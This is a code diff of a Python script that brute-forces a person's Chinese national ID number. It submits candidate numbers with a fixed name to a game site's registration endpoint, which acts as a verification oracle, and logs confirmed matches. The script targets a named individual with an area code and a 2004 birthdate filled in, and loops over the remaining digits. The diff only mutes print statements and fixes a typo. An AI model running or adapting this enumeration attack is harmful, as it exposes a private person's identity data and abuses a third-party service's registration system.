@@ -81,16 +81,16 @@ def check(sfz,xm):
     
     result=int(json.loads(s.post(url="http://zc.7k7k.com/post_reg",data=data).text)["state"])
     if(result==-10):
-        print("验证码识别识别 正在重试(Retry)")
+        #print("验证码识别识别 正在重试(Retry)")
         time.sleep(5)
         check(sfz,xm)
     elif result==0:
-        print(f"信息正确:{sfz} : {xm}")
+        #print(f"信息正确:{sfz} : {xm}")
         with open("success","a+") as f:
             f.write(f"信息正确:{sfz} : {xm}\n")
         return sfz,xm
     elif result==-1:
-        print(f"信息错误:{sfz} : {xm}")
+        #print(f"信息错误:{sfz} : {xm}")
         return False,False
 #-------------------------------------------------------------------
 former="33082120040322"        #区号+生日
@@ -99,7 +99,7 @@ o="0123456789X"
 m="13579"#male 男性
 f="02468"#female 女性
 xm="刘彦阳"#姓名
-is_male:True#是否男性
+is_male=True#是否男性
 #-------------------------------------------------------------------
 for i in lis:
     for j in lis:
